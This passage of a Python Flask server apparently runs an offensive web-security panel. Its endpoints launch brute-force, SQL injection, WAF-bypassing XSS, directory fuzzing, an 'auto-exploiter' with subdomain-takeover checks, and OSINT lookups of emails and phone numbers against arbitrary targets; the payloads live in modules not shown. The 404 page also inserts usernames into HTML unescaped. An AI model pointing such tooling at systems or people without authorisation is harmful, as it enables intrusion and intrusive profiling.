@app.route("/api/exploit/bruteforce/stop", methods=["POST"])
@login_required
def api_exploit_bruteforce_stop():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        AnalyticDataManager().stop_brute_force()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/sql_inject", methods=["POST"])
@login_required
def api_exploit_sql_inject():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "URL required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_sql_injection_scan(
            url, data.get("method", "GET"), data.get("params")
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/xss", methods=["POST"])
@login_required
def api_exploit_xss():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "URL required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_xss_scan(
            url, data.get("method", "GET"), data.get("params")
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Directory Fuzzer API (dirfuzz.py)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/dirfuzz/wordlists")
@api_login_required
def api_dirfuzz_wordlists():
    if not _dirfuzz_available:
        return jsonify({"error": "dirfuzz module not available"}), 503
    try:
        return jsonify({"wordlists": dirfuzz_list_wordlists()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/dirfuzz/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_dirfuzz_scan():
    if not _dirfuzz_available:
        return jsonify({"error": "dirfuzz module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    options = {
        "wordlist_name":    data.get("wordlist_name", "lottery-dirs.txt"),
        "wordlist":         data.get("wordlist"),
        "max_paths":        int(data.get("max_paths", 300)),
        "concurrency":      int(data.get("concurrency", 24)),
        "rate_limit":       float(data.get("rate_limit", 40.0)),
        "timeout":          float(data.get("timeout", 4.0)),
        "max_duration":     float(data.get("max_duration", 90.0)),
        "follow_redirects": bool(data.get("follow_redirects", False)),
    }
    try:
        return jsonify(dirfuzz_run(target, options))
    except Exception as e:
        logger.error(f"dirfuzz scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/dirfuzz/scan/stream")
@role_required("owner", "analyst")
def api_dirfuzz_scan_stream():
    if not _dirfuzz_available:
        return jsonify({"error": "dirfuzz module not available"}), 503
    target = (request.args.get("target") or request.args.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    cancel_event = threading.Event()

    options = {
        "wordlist_name":    request.args.get("wordlist_name", "lottery-dirs.txt"),
        "max_paths":        int(request.args.get("max_paths", 300)),
        "concurrency":      int(request.args.get("concurrency", 24)),
        "rate_limit":       float(request.args.get("rate_limit", 40.0)),
        "timeout":          float(request.args.get("timeout", 4.0)),
        "max_duration":     float(request.args.get("max_duration", 90.0)),
        "follow_redirects": request.args.get("follow_redirects", "0") == "1",
        "cancel_event":     cancel_event,
    }

    def _gen():
        try:
            for event in dirfuzz_stream(target, options, cancel_event=cancel_event):
                yield _sse_format(event)
        except GeneratorExit:
            cancel_event.set()
        except Exception as e:
            logger.error(f"dirfuzz stream failed: {e}", exc_info=True)
            yield _sse_format({"type": "error", "message": str(e)})

    return _sse_response(_gen())


# ═══════════════════════════════════════════════════════════════════════════
# SQLi Engine API (sqli_engine.py)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/sqli/wordlists")
@api_login_required
def api_sqli_wordlists():
    if not _sqli_engine_available:
        return jsonify({"error": "sqli_engine module not available"}), 503
    try:
        return jsonify(sqli_ensure_wordlists())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sqli/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_sqli_scan():
    if not _sqli_engine_available:
        return jsonify({"error": "sqli_engine module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    techniques = data.get("techniques") or ["error", "boolean", "time", "union"]
    options = {
        "techniques":   techniques,
        "params":       data.get("params"),
        "max_params":   int(data.get("max_params", 10)),
        "concurrency":  int(data.get("concurrency", 8)),
        "rate_limit":   float(data.get("rate_limit", 20.0)),
        "timeout":      float(data.get("timeout", 8.0)),
        "max_duration": float(data.get("max_duration", 90.0)),
        "method":       data.get("method", "GET"),
        "headers":      data.get("headers"),
        "cookies":      data.get("cookies"),
    }
    try:
        return jsonify(sqli_run(target, options))
    except Exception as e:
        logger.error(f"sqli scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/sqli/scan/stream")
@role_required("owner", "analyst")
def api_sqli_scan_stream():
    if not _sqli_engine_available:
        return jsonify({"error": "sqli_engine module not available"}), 503
    target = (request.args.get("target") or request.args.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    tech_arg = request.args.get("techniques", "error,boolean,time,union")
    techniques = [t.strip() for t in tech_arg.split(",") if t.strip()]
    cancel_event = threading.Event()

    options = {
        "techniques":   techniques,
        "max_params":   int(request.args.get("max_params", 10)),
        "concurrency":  int(request.args.get("concurrency", 8)),
        "rate_limit":   float(request.args.get("rate_limit", 20.0)),
        "timeout":      float(request.args.get("timeout", 8.0)),
        "max_duration": float(request.args.get("max_duration", 90.0)),
        "method":       request.args.get("method", "GET"),
        "cancel_event": cancel_event,
    }

    def _gen():
        try:
            for event in sqli_stream(target, options, cancel_event=cancel_event):
                yield _sse_format(event)
        except GeneratorExit:
            cancel_event.set()
        except Exception as e:
            logger.error(f"sqli stream failed: {e}", exc_info=True)
            yield _sse_format({"type": "error", "message": str(e)})

    return _sse_response(_gen())


# ═══════════════════════════════════════════════════════════════════════════
# SQLMap API (sql_map.py) — advanced multi-technique scanner
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/sqlmap/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_sqlmap_scan():
    if not _sql_map_available:
        return jsonify({"error": "sql_map module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    mode = data.get("mode", "basic")
    if mode not in ("basic", "expert"):
        mode = "basic"

    kwargs = {
        "method":     data.get("method", "GET"),
        "params":     data.get("params"),
        "timeout":    float(data.get("timeout", 5.0)),
        "max_threads": int(data.get("max_threads", 10)),
        "verify_ssl": bool(data.get("verify_ssl", False)),
        "headers":    data.get("headers"),
        "cookies":    data.get("cookies"),
        "proxies":    data.get("proxies"),
    }
    try:
        return jsonify(sql_map_module.run(target, mode, **kwargs))
    except Exception as e:
        logger.error(f"sql_map scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Lightweight SQL Injection (sql_injection.py)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/sql_injection/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_sql_injection_scan():
    if not _sql_injection_available:
        return jsonify({"error": "sql_injection module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    try:
        return jsonify(sql_injection_module.run_sql_injection(
            target,
            method=data.get("method", "GET"),
            params=data.get("params") or {},
        ))
    except Exception as e:
        logger.error(f"sql_injection scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# XSS Exploiter API (xss_exploiter.py)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/xss/wordlist")
@api_login_required
def api_xss_wordlist():
    if not _xss_exploiter_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    try:
        return jsonify(xss_ensure_wordlist())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/xss/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_xss_scan():
    if not _xss_exploiter_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    options = {
        "max_payloads": int(data.get("max_payloads", 30)),
        "max_params":   int(data.get("max_params", 10)),
        "concurrency":  int(data.get("concurrency", 8)),
        "rate_limit":   float(data.get("rate_limit", 20.0)),
        "timeout":      float(data.get("timeout", 8.0)),
        "waf_bypass":   bool(data.get("waf_bypass", False)),
        "params":       data.get("params"),
        "method":       data.get("method", "GET"),
        "max_duration": data.get("max_duration"),
    }
    try:
        return jsonify(xss_exploiter_run(target, options))
    except Exception as e:
        logger.error(f"xss scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/xss/scan/stream")
@role_required("owner", "analyst")
def api_xss_scan_stream():
    if not _xss_exploiter_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    target = (request.args.get("target") or request.args.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    cancel_event = threading.Event()
    options = {
        "max_payloads": int(request.args.get("max_payloads", 30)),
        "max_params":   int(request.args.get("max_params", 10)),
        "concurrency":  int(request.args.get("concurrency", 8)),
        "rate_limit":   float(request.args.get("rate_limit", 20.0)),
        "timeout":      float(request.args.get("timeout", 8.0)),
        "waf_bypass":   request.args.get("waf_bypass", "0") == "1",
        "method":       request.args.get("method", "GET"),
        "cancel_event": cancel_event,
    }

    def _gen():
        try:
            for event in xss_exploiter_stream(target, options, cancel_event=cancel_event):
                yield _sse_format(event)
        except GeneratorExit:
            cancel_event.set()
        except Exception as e:
            logger.error(f"xss stream failed: {e}", exc_info=True)
            yield _sse_format({"type": "error", "message": str(e)})

    return _sse_response(_gen())


# ═══════════════════════════════════════════════════════════════════════════
# Lightweight XSS (xss.py)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/xss_simple/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_xss_simple_scan():
    if not _xss_available:
        return jsonify({"error": "xss module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    mode = data.get("mode", "basic")
    if mode not in ("basic", "expert"):
        mode = "basic"
    kwargs = {
        "method":     data.get("method", "GET"),
        "params":     data.get("params"),
        "timeout":    float(data.get("timeout", 5.0)),
        "max_threads": int(data.get("max_threads", 10)),
        "verify_ssl": bool(data.get("verify_ssl", False)),
    }
    try:
        return jsonify(xss_module.run(target, mode, **kwargs))
    except Exception as e:
        logger.error(f"xss module scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Sniper — Auto-Exploiter orchestrator
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/sniper/scan", methods=["POST"])
@role_required("owner", "analyst")
def api_sniper_scan():
    if not _sniper_available:
        return jsonify({"error": "sniper module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    options = {
        "module_timeout":        float(data.get("module_timeout", 90.0)),
        "global_budget":         float(data.get("global_budget", 150.0)),
        "dirfuzz_wordlist":      data.get("dirfuzz_wordlist", "lottery-dirs.txt"),
        "dirfuzz_max_paths":     int(data.get("dirfuzz_max_paths", 80)),
        "xss_max_payloads":      int(data.get("xss_max_payloads", 20)),
        "takeover_enumerate":    bool(data.get("takeover_enumerate", True)),
        "takeover_max_hosts":    int(data.get("takeover_max_hosts", 120)),
    }
    try:
        return jsonify(sniper_run(target, options))
    except Exception as e:
        logger.error(f"sniper scan failed: {e}", exc_info=True)
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/sniper/scan/stream")
@role_required("owner", "analyst")
def api_sniper_scan_stream():
    if not _sniper_available:
        return jsonify({"error": "sniper module not available"}), 503
    target = (request.args.get("target") or request.args.get("url") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400

    options = {
        "module_timeout":    float(request.args.get("module_timeout", 90.0)),
        "global_budget":     float(request.args.get("global_budget", 150.0)),
        "dirfuzz_wordlist":  request.args.get("dirfuzz_wordlist", "lottery-dirs.txt"),
        "dirfuzz_max_paths": int(request.args.get("dirfuzz_max_paths", 80)),
        "xss_max_payloads":  int(request.args.get("xss_max_payloads", 20)),
        "takeover_enumerate": request.args.get("takeover_enumerate", "1") == "1",
        "takeover_max_hosts": int(request.args.get("takeover_max_hosts", 120)),
    }

    def _gen():
        try:
            for event in sniper_stream(target, options):
                yield _sse_format(event)
        except GeneratorExit:
            pass
        except Exception as e:
            logger.error(f"sniper stream failed: {e}", exc_info=True)
            yield _sse_format({"type": "error", "message": str(e)})

    return _sse_response(_gen())


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Logger API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/logger/requests", methods=["GET"])
@role_required("owner", "analyst")
def api_logger_requests():
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    try:
        page = int(request.args.get("page", 1))
        size = int(request.args.get("size", 100))
        q = request.args.get("q") or None
        method = request.args.get("method") or None
        status_min = request.args.get("status_min", type=int)
        status_max = request.args.get("status_max", type=int)
        anomaly = request.args.get("anomaly") or None
        tag = request.args.get("tag") or None
        ip = request.args.get("ip") or None
        since_ms = request.args.get("since_ms", type=int)

        result = http_logger.list(
            page=page, size=size, q=q, method=method,
            status_min=status_min, status_max=status_max,
            anomaly=anomaly, tag=tag, ip=ip, since_ms=since_ms,
        )
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/logger/requests/<entry_id>", methods=["GET"])
@role_required("owner", "analyst")
def api_logger_request_detail(entry_id):
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    entry = http_logger.get(entry_id)
    if entry is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(entry)


@app.route("/api/logger/stats", methods=["GET"])
@role_required("owner", "analyst")
def api_logger_stats():
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    try:
        return jsonify(http_logger.stats())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/logger/clear", methods=["POST"])
@role_required("owner")
def api_logger_clear():
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    try:
        n = http_logger.clear()
        return jsonify({"success": True, "cleared": n})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/logger/requests/<entry_id>/tag", methods=["POST"])
@role_required("owner", "analyst")
def api_logger_tag(entry_id):
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    data = request.get_json(silent=True) or {}
    tag = (data.get("tag") or "").strip()
    add = bool(data.get("add", True))
    if not tag:
        return jsonify({"error": "tag_required"}), 400
    ok = http_logger.tag(entry_id, tag, add=add)
    if not ok:
        return jsonify({"error": "not_found"}), 404
    return jsonify({"success": True})


@app.route("/api/logger/har", methods=["GET"])
@role_required("owner", "analyst")
def api_logger_har():
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503
    try:
        # Re-use the list() filters to select the entries
        page = int(request.args.get("page", 1))
        size = min(int(request.args.get("size", 200)), 1000)
        q = request.args.get("q") or None
        method = request.args.get("method") or None
        status_min = request.args.get("status_min", type=int)
        status_max = request.args.get("status_max", type=int)
        anomaly = request.args.get("anomaly") or None
        tag = request.args.get("tag") or None
        ip = request.args.get("ip") or None

        listing = http_logger.list(
            page=page, size=size, q=q, method=method,
            status_min=status_min, status_max=status_max,
            anomaly=anomaly, tag=tag, ip=ip,
        )
        har = http_logger.to_har(listing["items"])
        return jsonify(har)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/logger/stream")
@role_required("owner", "analyst")
def api_logger_stream():
    if http_logger is None:
        return jsonify({"error": "http_logger not available"}), 503

    subscriber = http_logger.subscribe()

    def _gen():
        try:
            # Initial handshake
            yield _sse_format({
                "type": "hello",
                "stats": http_logger.stats(),
            })
            last_heartbeat = time.monotonic()
            while True:
                try:
                    event = subscriber.get(timeout=1.0)
                    yield _sse_format(event)
                except Exception:
                    pass
                now = time.monotonic()
                if now - last_heartbeat >= 15.0:
                    last_heartbeat = now
                    yield _sse_format({"type": "heartbeat", "ts": int(now)})
        except GeneratorExit:
            pass
        finally:
            http_logger.unsubscribe(subscriber)

    return _sse_response(_gen())


# ═══════════════════════════════════════════════════════════════════════════
# 404 handler
# ═══════════════════════════════════════════════════════════════════════════
@app.errorhandler(404)
def page_not_found(e):
    username = session.get("username") if session.get("authenticated") else "Guest"
    html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOST AREA</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: #000000;
            background-image:
                radial-gradient(ellipse at 20% 20%, rgba(255,255,255,0.05) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 80%, rgba(255,255,255,0.05) 0%, transparent 50%),
                repeating-linear-gradient(45deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 1px, transparent 1px, transparent 30px),
                repeating-linear-gradient(-45deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 1px, transparent 1px, transparent 30px);
            color: #ffffff;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: "";
            position: absolute;
            inset: 0;
            background: radial-gradient(ellipse at center, rgba(255,255,255,0.04) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
            pointer-events: none;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.5; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.08); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .center-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex: 1;
            animation: fadeIn 1.5s ease-out;
        }
        .username {
            font-size: 0.9rem;
            letter-spacing: 0.2em;
            color: #aaaaaa;
            text-transform: uppercase;
            margin-bottom: 10px;
        }
        .main-title {
            font-size: clamp(1.2rem, 3.5vw, 2.5rem);
            font-weight: 300;
            letter-spacing: 0.35em;
            text-align: center;
            text-transform: uppercase;
            color: #ffffff;
            text-shadow: 0 0 30px rgba(255,255,255,0.15);
        }
        .sad-face {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 0px;
            margin-top: 25px;
            font-size: clamp(1.5rem, 5vw, 3rem);
            color: #ffffff;
            text-shadow: 0 0 20px rgba(255,255,255,0.2);
            animation: slightFloat 3s ease-in-out infinite;
            line-height: 0.45;
        }
        .sleep-colon,
        .sleep-mouth {
            display: inline-block;
            transform: rotate(90deg);
            transform-origin: center;
            animation: breathe 2.5s ease-in-out infinite;
        }
        .sleep-mouth { margin-top: -0.1em; }
        @keyframes breathe {
            0%, 100% { transform: rotate(90deg) scale(1); }
            50% { transform: rotate(90deg) scale(0.9); }
        }
        @keyframes slightFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        .bottom-bar {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            padding: 15px;
            animation: fadeIn 2s ease-out;
        }
        .url-not-found {
            font-size: 0.8rem;
            letter-spacing: 0.25em;
            color: #888888;
            text-transform: uppercase;
        }
        .url-address {
            font-size: 0.7rem;
            letter-spacing: 0.1em;
            color: #aaaaaa;
            margin-top: 8px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="center-content">
        <div class="username" id="usernameDisplay">__USERNAME__</div>
        <div class="main-title">Lost Area</div>
        <div class="sad-face">
            <span class="sleep-colon">:</span>
            <span class="sleep-mouth">(</span>
        </div>
    </div>
    <div class="bottom-bar">
        <div class="url-not-found">URL Not Found</div>
        <div class="url-address" id="currentUrl"></div>
    </div>
    <script>
        document.getElementById('currentUrl').textContent = window.location.href;
    </script>
</body>
</html>"""
    html = html.replace("__USERNAME__", username)
    return html, 404


# ═══════════════════════════════════════════════════════════════════════════
# Emergens additional endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/settings/server-name', methods=['GET', 'POST'])
@login_required
def server_name():
    if request.method == 'GET':
        settings = _load_json('settings', {})
        return jsonify({'name': settings.get('server_name', '')})

    u = current_user()
    if u and u.get('role') != 'owner':
        return jsonify({'error': 'Owner access required'}), 403

    body = request.get_json(silent=True) or {}
    with _json_lock('settings'):
        settings = _load_json('settings', {})
        settings['server_name'] = (body.get('name') or '').strip()
        _save_json('settings', settings)
    logger.info(f'Server name set to "{settings["server_name"]}" by "{session.get("username")}"')
    return jsonify({'name': settings['server_name']})


@app.route('/api/settings/servers')
@owner_required
def panel_manager():
    return jsonify(_load_json('servers', []))


ALLOWED_IMAGE_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}


@app.route('/api/profile/photo', methods=['POST'])
@login_required
def profile_photo():
    u = current_user()
    if not u:
        return jsonify({'error': 'Not authenticated'}), 401
    body = request.get_json(silent=True) or {}

    with _json_lock('profiles'):
        profiles = _load_json('profiles', {})
        profile = profiles.setdefault(u['username'], {})

        if body.get('remove'):
            profile['avatar_url'] = None
            _save_json('profiles', profiles)
            return jsonify({'ok': True, 'avatar_url': None})

        if body.get('url'):
            url = body['url'].strip()
            if not (url.startswith('http://') or url.startswith('https://')):
                return jsonify({'error': 'Please provide a valid http(s) image URL.'}), 400
            profile['avatar_url'] = url
            _save_json('profiles', profiles)
            return jsonify({'ok': True, 'avatar_url': url})

        if body.get('image_base64'):
            data_url = body['image_base64']
            try:
                header, encoded = data_url.split(',', 1)
                mime = header.split(';')[0].replace('data:', '')
                if mime not in ALLOWED_IMAGE_TYPES:
                    return jsonify({'error': 'Unsupported image type.'}), 400
                raw = base64.b64decode(encoded)
                if len(raw) > 5 * 1024 * 1024:
                    return jsonify({'error': 'Image is too large (max 5MB).'}), 400
                ext = mime.split('/')[1]
                filename = f'{u["username"]}_{uuid.uuid4().hex[:8]}.{ext}'
                with open(os.path.join(UPLOAD_DIR, filename), 'wb') as f:
                    f.write(raw)
                profile['avatar_url'] = f'/api/profile/photo/{filename}'
                _save_json('profiles', profiles)
                return jsonify({'ok': True, 'avatar_url': profile['avatar_url']})
            except (ValueError, binascii.Error):
                return jsonify({'error': 'Could not decode that image.'}), 400

    return jsonify({'error': 'Provide image_base64, url, or remove:true.'}), 400


@app.route('/api/profile/photo/<path:filename>')
def serve_profile_photo(filename):
    return send_from_directory(UPLOAD_DIR, filename)


# ═══════════════════════════════════════════════════════════════════════════
# Global Chat
# ═══════════════════════════════════════════════════════════════════════════
CHAT_HISTORY_LIMIT = 300
_chat_cache = {'data': None, 'mtime': 0.0}
_chat_cache_lock = threading.Lock()


def _get_chat_cached():
    path = os.path.join(DATA_DIR, 'chat.json')
    try:
        mtime = os.path.getmtime(path)
    except OSError:
        return {'messages': [], 'locked': False}
    with _chat_cache_lock:
        if _chat_cache['data'] is not None and _chat_cache['mtime'] == mtime:
            return _chat_cache['data']
    data = _load_json('chat', {'messages': [], 'locked': False})
    with _chat_cache_lock:
        _chat_cache['data'] = data
        _chat_cache['mtime'] = mtime
    return data


@app.route('/api/chat/messages')
@login_required
def chat_messages():
    chat = _get_chat_cached()
    profiles = _load_json('profiles', {})
    users_by_name = {u['username']: u for u in _load_json('users', [])}
    enriched = []
    for m in chat.get('messages', []):
        u = users_by_name.get(m.get('username'))
        enriched.append({
            **m,
            'role': u.get('role') if u else m.get('role', '--'),
            'avatar_url': profiles.get(m.get('username'), {}).get('avatar_url'),
        })
    return jsonify({'messages': enriched, 'locked': chat.get('locked', False)})


@app.route('/api/chat/send', methods=['POST'])
@login_required
def chat_send():
    u = current_user()
    if not u:
        return jsonify({'error': 'Not authenticated'}), 401

    body = request.get_json(silent=True) or {}
    text = (body.get('text') or '').strip()
    if not text:
        return jsonify({'error': 'Message text is required.'}), 400
    text = text[:500]

    with _json_lock('chat'):
        chat = _load_json('chat', {'messages': [], 'locked': False})
        if chat.get('locked') and u.get('role') != 'owner':
            return jsonify({'error': 'Chat is locked by the Owner.'}), 423

        message = {
            'id': uuid.uuid4().hex,
            'username': u['username'],
            'role': u['role'],
            'text': text,
            'timestamp': _now_iso(),
        }
        chat['messages'].append(message)
        chat['messages'] = chat['messages'][-CHAT_HISTORY_LIMIT:]
        _save_json('chat', chat)

    return jsonify({'ok': True, 'id': message['id']})


@app.route('/api/chat/lock', methods=['POST'])
@owner_required
def chat_lock():
    body = request.get_json(silent=True) or {}
    with _json_lock('chat'):
        chat = _load_json('chat', {'messages': [], 'locked': False})
        chat['locked'] = bool(body.get('locked'))
        chat['messages'].append({
            'id': uuid.uuid4().hex,
            'is_system': True,
            'text': f'{session.get("username")} {"locked" if chat["locked"] else "unlocked"} Global Chat.',
            'timestamp': _now_iso(),
        })
        _save_json('chat', chat)
    return jsonify({'ok': True, 'locked': chat['locked']})


# ═══════════════════════════════════════════════════════════════════════════
# OSINT module contract
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/osint/search', methods=['POST'])
@login_required
def osint_search():
    body = request.get_json(silent=True) or {}
    method = body.get('method')
    query = (body.get('query') or '').strip()
    if method not in ('username', 'email', 'number') or not query:
        return jsonify({'error': 'method and query are required.'}), 400
    try:
        osint_module = import_module('modules.osint')
    except ModuleNotFoundError:
        return jsonify({'error': 'modules/osint.py not found on the server yet.'}), 404
    try:
        results = osint_module.search(method, query)
    except Exception as e:
        logger.error(f'modules.osint.search raised: {e}')
        return jsonify({'error': f'OSINT module error: {e}'}), 500
    logger.info(f'OSINT search ({method}) by "{session.get("username")}": {query}')
    return jsonify({'sources': results})


# ═══════════════════════════════════════════════════════════════════════════
# External API v1
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/v1/ping', methods=['POST'])
@_api_key_required
def v1_ping():
    return jsonify({'ok': True, 'server_time': _now_iso(), 'owner': g.api_key_owner})


@app.route('/api/v1/scan', methods=['POST'])
@_api_key_required
def v1_scan_start():
    body = request.get_json(silent=True) or {}
    target = (body.get('target') or '').strip()
    mode = body.get('mode') or 'basic'
    tools = body.get('tools') or []
    if not target:
        return jsonify({'error': 'A target is required.'}), 400
    return jsonify({'job_id': scan_orchestrator.start_scan(target, mode, tools, history_store)})


@app.route('/api/v1/scan/<job_id>')
@_api_key_required
def v1_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None:
        return jsonify({'error': 'not_found'}), 404
    return jsonify(progress)


# ═══════════════════════════════════════════════════════════════════════════
# Module status (dashboard hint panel)
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/modules/status")
@api_login_required
def api_modules_status():
    return jsonify({
        "dirfuzz":        {"available": _dirfuzz_available},
        "sqli_engine":    {"available": _sqli_engine_available,
                            "sources": list(SQLI_WORDLIST_SOURCES.keys()) if _sqli_engine_available else []},
        "sql_map":        {"available": _sql_map_available},
        "sql_injection":  {"available": _sql_injection_available},
        "xss_exploiter":  {"available": _xss_exploiter_available},
        "xss":            {"available": _xss_available},
        "sniper":         {"available": _sniper_available},
        "http_logger":    {"available": http_logger is not None},
        "testing":        {"available": _testing_available},
        "analytic":       {"available": _analytic_available},
        "downsea":        {"available": _downsea_available},
        "quick_menu":     {"available": _quick_menu_available},
    })


# ═══════════════════════════════════════════════════════════════════════════
# Startup
# ═══════════════════════════════════════════════════════════════════════════
def _print_startup(port=None):
    """Single clean startup banner — no ==== separators, no module spam."""
    print(BANNER, flush=True)
    info_lines = []
    if port is not None:
        info_lines.append(f"  Server     : http://localhost:{port}")
    info_lines.append(f"  Tools      : {len(scan_orchestrator.list_tools())} loaded")
    info_lines.append(f"  Account    : {DEFAULT_USERNAME}")

    modules = []
    if _dirfuzz_available:      modules.append("dirfuzz")
    if _sqli_engine_available:  modules.append("sqli_engine")
    if _sql_map_available:      modules.append("sql_map")
    if _sql_injection_available: modules.append("sql_injection")
    if _xss_exploiter_available: modules.append("xss_exploiter")
    if _xss_available:          modules.append("xss")
    if _sniper_available:       modules.append("sniper")
    if http_logger is not None: modules.append("http_logger")
    if modules:
        info_lines.append(f"  Modules    : {', '.join(modules)}")
    print("\n".join(info_lines), flush=True)
    print(flush=True)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "reset-password":
        existing_role = get_role(DEFAULT_USERNAME) or "owner"
        new_password = create_user(DEFAULT_USERNAME, role=existing_role)
        print(BANNER, flush=True)
        print(f"  Password reset for '{DEFAULT_USERNAME}' (role={existing_role})", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Copy it now — it will not be shown again.", flush=True)
        sys.exit(0)

    new_password = ensure_default_user()
    if new_password:
        print(BANNER, flush=True)
        print("  First run — account created automatically", flush=True)
        print(f"  Username: {DEFAULT_USERNAME}", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Role:     owner", flush=True)
        print("  Save this password now — you will need it to log in.", flush=True)
        print(flush=True)

